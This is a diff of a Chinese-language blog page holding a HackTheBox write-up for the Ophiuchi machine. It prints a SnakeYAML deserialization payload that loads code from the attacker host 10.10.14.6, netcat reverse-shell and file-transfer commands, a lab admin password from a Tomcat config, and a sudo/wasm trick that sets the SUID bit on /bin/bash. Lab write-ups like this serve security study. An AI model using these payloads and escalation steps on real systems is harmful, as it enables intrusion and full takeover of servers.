@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;315  10.10.10.227                                                                                                              端口扫描22和8080: 1234567">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;315  10.10.10.227   端口扫描22和8080: 123456789101112131415161718$ nmap -sC -sV 10.10.10.227Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-18 13:16">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Ophiuchi - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2021/02/18/Ophiuchi-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;315  10.10.10.227                                                                                                              端口扫描22和8080: 1234567">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;315  10.10.10.227   端口扫描22和8080: 123456789101112131415161718$ nmap -sC -sV 10.10.10.227Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-18 13:16">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021801.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021802.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021803.jpg">
@@ -121,8 +121,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -144,7 +151,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -212,28 +219,14 @@
 </li>
 <li><h2 id="10-10-10-227"><a href="#10-10-10-227" class="headerlink" title="10.10.10.227"></a>10.10.10.227</h2></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021801.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021801.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和8080:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.10.227</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-18 13:16 CST</span><br><span class="line">Nmap scan report for 10.10.10.227</span><br><span class="line">Host is up (0.068s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)</span><br><span class="line">|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)</span><br><span class="line">|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)</span><br><span class="line">8080/tcp open  http    Apache Tomcat 9.0.38</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-title: Parse YAML</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 29.12 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><p>一个在线的yaml parser：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021802.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021802.jpg" alt=""></p>
 <h1 id="YAML"><a href="#YAML" class="headerlink" title="YAML"></a>YAML</h1><p>简单的搜索：</p>
 <ul>
 <li>SnakeYaml Deserilization exploited | by Swapneil Kumar Dash | Medium<br><a href="https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858" target="_blank" rel="noopener">https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858</a></li>
@@ -241,14 +234,7 @@
 </ul>
 <h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!javax</span><span class="string">.script.ScriptEngineManager</span> <span class="string">[</span></span><br><span class="line">  <span class="type">!!java</span><span class="string">.net.URLClassLoader</span> <span class="string">[[</span></span><br><span class="line">    <span class="type">!!java</span><span class="string">.net.URL</span> <span class="string">["http://10.10.14.6:4444/"]</span></span><br><span class="line">  <span class="string">]]</span></span><br><span class="line"><span class="string">]</span></span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021803.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021803.jpg" alt=""></p>
 <h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>直接用github的payload改下代码：</p>
 <ul>
 <li><a href="https://github.com/artsploit/yaml-payload" target="_blank" rel="noopener">https://github.com/artsploit/yaml-payload</a></li>
@@ -262,51 +248,16 @@
 <h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>监听端口，8080端口发送payload，打到tomcat用户shell：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># payload</span><br><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [&quot;http:&#x2F;&#x2F;10.10.14.6:7777&#x2F;&quot;]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># reverse shell </span><br><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021804.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021805.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021804.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021805.jpg" alt=""></p>
 <h1 id="tomcat-to-admin"><a href="#tomcat-to-admin" class="headerlink" title="tomcat to admin"></a>tomcat to admin</h1><p>tomcat配置文件里得到admin用户密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin : whythereisalimit</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021806.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021806.jpg" alt=""></p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>admin可以直接ssh登录，得到user.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021807.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021807.jpg" alt=""></p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><h2 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a>sudo -l</h2><p>查看sudo发现可以无密码运行一个go文件：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021808.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021808.jpg" alt=""></p>
 <p>查看代码发现是检查<strong>当前目录</strong>main.wasm中info值是否为1，为1则运行<strong>当前目录</strong>deply.sh文件,wasm文件也下载下来分析：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc 10.10.14.6 4444 &lt; main.wasm</span><br><span class="line">nc -lvvp 4444 &gt; main.wasm</span><br></pre></td></tr></table></figure>
 
@@ -314,43 +265,18 @@
 <ul>
 <li><a href="https://webassembly.github.io/wabt/demo/wasm2wat/index.html" target="_blank" rel="noopener">https://webassembly.github.io/wabt/demo/wasm2wat/index.html</a></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021809.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021809.jpg" alt=""></p>
 <p>发现info设置的0，修改为1后在这里编译下载：</p>
 <ul>
 <li><a href="https://webassembly.github.io/wabt/demo/wat2wasm/index.html" target="_blank" rel="noopener">https://webassembly.github.io/wabt/demo/wat2wasm/index.html</a></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021810.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021810.jpg" alt=""></p>
 <h2 id="index-go"><a href="#index-go" class="headerlink" title="index.go"></a>index.go</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	wasm <span class="string">"github.com/wasmerio/wasmer-go/wasmer"</span></span><br><span class="line">	<span class="string">"os/exec"</span></span><br><span class="line">	<span class="string">"log"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	bytes, _ := wasm.ReadBytes(<span class="string">"main.wasm"</span>)</span><br><span class="line"></span><br><span class="line">	instance, _ := wasm.NewInstance(bytes)</span><br><span class="line">	<span class="keyword">defer</span> instance.Close()</span><br><span class="line">	init := instance.Exports[<span class="string">"info"</span>]</span><br><span class="line">	result,_ := init()</span><br><span class="line">	f := result.String()</span><br><span class="line">	<span class="keyword">if</span> (f != <span class="string">"1"</span>) &#123;</span><br><span class="line">		fmt.Println(<span class="string">"Not ready to deploy"</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">"Ready to deploy"</span>)</span><br><span class="line">		out, err := exec.Command(<span class="string">"/bin/sh"</span>, <span class="string">"deploy.sh"</span>).Output()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Fatal(err)</span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(<span class="keyword">string</span>(out))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h1 id="提权-amp-amp-root-flag"><a href="#提权-amp-amp-root-flag" class="headerlink" title="提权 &amp;&amp; root flag"></a>提权 &amp;&amp; root flag</h1><p>然后就是在一个可写目录里准备好修改后的main.wasm和deply.sh文件，运行命令,可以简单的直接给bash suid(做完记得改回来，别影响其他人)：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.6:7777/test.wasm -O main.wasm</span><br><span class="line">echo "chmod +s /bin/bash" &gt; deploy.sh</span><br><span class="line">chmod 777 *</span><br><span class="line">sudo -u root /usr/bin/go run /opt/wasm-functions/index.go</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021811.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021021811.jpg" alt=""></p>
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>SnakeYaml Deserilization exploited | by Swapneil Kumar Dash | Medium<br><a href="https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858" target="_blank" rel="noopener">https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858</a></li>
 <li>artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads<br><a href="https://github.com/artsploit/yaml-payload" target="_blank" rel="noopener">https://github.com/artsploit/yaml-payload</a></li>
@@ -367,7 +293,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2021-07-05T00:51:22.814Z" itemprop="dateUpdated">2021-07-05 08:51:22</time>
+    Last updated: <time datetime="2021-07-05T00:51:22.814Z" itemprop="dateUpdated">2021-07-05 08:51:22</time>
 </span><br>
 
 
@@ -534,11 +460,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
